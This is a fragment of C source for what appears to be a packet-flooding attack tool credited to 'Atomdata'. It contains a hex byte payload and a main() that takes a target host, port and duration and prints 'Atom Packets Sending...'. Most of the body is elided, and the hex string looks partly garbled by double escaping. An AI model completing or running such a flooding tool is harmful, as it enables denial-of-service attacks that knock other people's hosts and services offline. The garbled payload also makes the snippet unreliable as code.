...
"\x5c\x78\x35\x63\xe4\x64\xbd\x29\xbf\xc3\x0d\x30\x89\x86\x00\x00\xe4\x64\xbd\x29\xbf\xba\x98\xed\x5c\x78\x35\x63\x5c\x78\x37\x38\x5c\x86\x23\x55\xc7\x80\x00\x0f\xf4\x50\x00\x0e\xe0\x00\x00\x00";
...
int main(int argc, char *argv[]) {
  if (argc < 6) {
    fprintf(stdout, "%s host port [Atom.txt] 2 -1 time This was made by Atomdata\n",
            argv[0]);
    exit(-1);
  }
  srand(time(NULL));
  ...
  fprintf(stdout, "Atom Packets Sending...\n");
